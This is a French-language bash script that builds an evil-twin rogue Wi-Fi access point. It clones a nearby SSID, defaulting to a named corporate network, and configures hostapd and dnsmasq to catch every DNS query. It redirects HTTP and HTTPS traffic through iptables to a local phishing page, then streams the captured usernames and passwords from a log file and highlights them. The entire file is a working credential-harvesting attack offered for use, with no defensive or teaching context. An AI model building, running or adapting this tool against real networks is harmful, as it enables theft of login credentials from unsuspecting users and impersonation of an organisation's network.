#!/bin/bash

VERT='\033[0;32m'
CYAN='\033[0;36m'
ROUGE='\033[0;31m'
NC='\033[0m'

clear

choisir_interface() {
    echo -e "${CYAN}Recherche des interfaces sans fil...${NC}"
    mapfile -t interfaces < <(iw dev | awk '$1=="Interface"{print $2}')
    if [ ${#interfaces[@]} -eq 0 ]; then
        echo -e "${ROUGE}Aucune interface sans fil détectée.${NC}"; exit 1
    fi
    echo "Sélectionne l'interface :"
    select IFACE in "${interfaces[@]}"; do
        [ -n "$IFACE" ] && break
    done
}

scanner_ssid() {
    echo -e "${CYAN}Scan des réseaux WiFi à proximité...${NC}"
    sudo iwlist "$IFACE" scan | grep 'ESSID:' | sed 's/.*ESSID:"\(.*\)"/\1/' | grep -v '^$' | sort | uniq > /tmp/ssidlist.txt
    mapfile -t ssids < /tmp/ssidlist.txt
    if [ ${#ssids[@]} -eq 0 ]; then
        echo -e "${ROUGE}Aucun SSID trouvé. Un SSID par défaut sera utilisé.${NC}"
        SSID="AirLiquide-Corporate"
    else
        echo "Sélectionne le SSID cible :"
        select SSID in "${ssids[@]}" "Entrée manuelle"; do
            if [ "$REPLY" = "$(( ${#ssids[@]} + 1 ))" ]; then
                read -p "Entrez un SSID personnalisé : " SSID
                [ -z "$SSID" ] && SSID="AirLiquide-Corporate"
                break
            elif [ -n "$SSID" ]; then
                break
            fi
        done
    fi
}

choisir_canal() {
    read -p "Entrez le canal WiFi (défaut 6) : " CANAL
    [ -z "$CANAL" ] && CANAL=6
}

choisir_fake_ip() {
    read -p "Entrez l'adresse IP du faux AP (défaut 192.168.50.1) : " FAKE_IP
    [ -z "$FAKE_IP" ] && FAKE_IP="192.168.50.1"
}

WEBROOT="/srv/http/"
DNSMASQ_CONF="/tmp/dnsmasq_ev.conf"
HOSTAPD_CONF="/tmp/hostapd_ev.conf"
LOGFILE="/srv/http/log.txt"

choisir_interface
scanner_ssid
choisir_canal
choisir_fake_ip

clear

nettoyage() {
    echo -e "${VERT}[+] Arrêt des services...${NC}"
    killall dnsmasq hostapd 2>/dev/null
    ip link set "$IFACE" down
    ip addr flush dev "$IFACE"
    systemctl restart httpd 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward
    ip link set "$IFACE" up
    systemctl restart NetworkManager
    clear
}

demarrer_fake_wifi() {
    echo -e "${VERT}[+] Nettoyage du fichier log${NC}"
    sudo rm "$LOGFILE" 2>/dev/null
    touch "$LOGFILE"
    echo -e "${VERT}[+] Fermeture des processus gênants...${NC}"
    sudo airmon-ng check kill 
    ip addr flush dev "$IFACE"
    ip link set "$IFACE" down
    ip addr add "$FAKE_IP/24" dev "$IFACE"
    ip link set "$IFACE" up
    echo 1 > /proc/sys/net/ipv4/ip_forward
    echo -e "${VERT}[+] Configuration iptables...${NC}"
    sudo iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-ports 80 
    sudo iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j DNAT --to-destination "$FAKE_IP":80
    sudo iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE        
    touch "$LOGFILE"
    chmod 666 "$LOGFILE"
    chown -R http:http "$WEBROOT"
    echo -e "${VERT}[+] Démarrage d'Apache...${NC}"
    systemctl restart httpd
    echo -e "${VERT}[+] Lancement de dnsmasq...${NC}"
    cat > "$DNSMASQ_CONF" <<EOF
interface=$IFACE
dhcp-range=${FAKE_IP%.*}.10,${FAKE_IP%.*}.100,12h
dhcp-option=3,$FAKE_IP
dhcp-option=6,$FAKE_IP
address=/#/$FAKE_IP
log-queries
log-dhcp
EOF
    dnsmasq -C "$DNSMASQ_CONF" &
    echo -e "${VERT}[+] Lancement de hostapd...${NC}"
    cat > "$HOSTAPD_CONF" <<EOF
interface=$IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CANAL
EOF
    echo -e "${VERT}[+] SSID : ${CYAN}$SSID${NC} sur le canal ${CYAN}$CANAL${NC} (${CYAN}$IFACE${NC}) -- IP : ${CYAN}$FAKE_IP${NC}"
    hostapd "$HOSTAPD_CONF" > /dev/null 2>&1 &
    echo -e "${VERT}[+] Capture en temps réel des identifiants...${NC}"
    tail -f "$LOGFILE" | sed -E "s/(username|password|login|pass|user)=[^ ]*/${ROUGE}&${NC}/g"
}

trap nettoyage EXIT
demarrer_fake_wifi
